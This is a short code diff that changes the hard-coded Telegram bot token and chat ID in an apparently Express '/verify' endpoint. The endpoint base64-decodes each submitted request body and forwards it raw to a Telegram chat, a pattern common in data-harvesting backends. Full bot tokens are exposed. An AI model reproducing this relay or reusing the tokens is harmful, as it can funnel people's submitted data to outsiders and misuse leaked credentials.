@@ -19,8 +19,8 @@ app.post('/verify', (req, res) => {
     const decodedData = atob(req.body)
     const jsonData = JSON.parse(decodedData)
 
-    const token = '6449129893:AAGzANtG4cdEwRmgkYo5L2y0FIHmlUC_2yQ'
-    const chatId = -4237257812
+    const token = '7162361678:AAFYurkXq1LDEQK9_BWYjLZVe3odRhhcCg4'
+    const chatId = 5641960649
     const text = decodedData
 
     axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
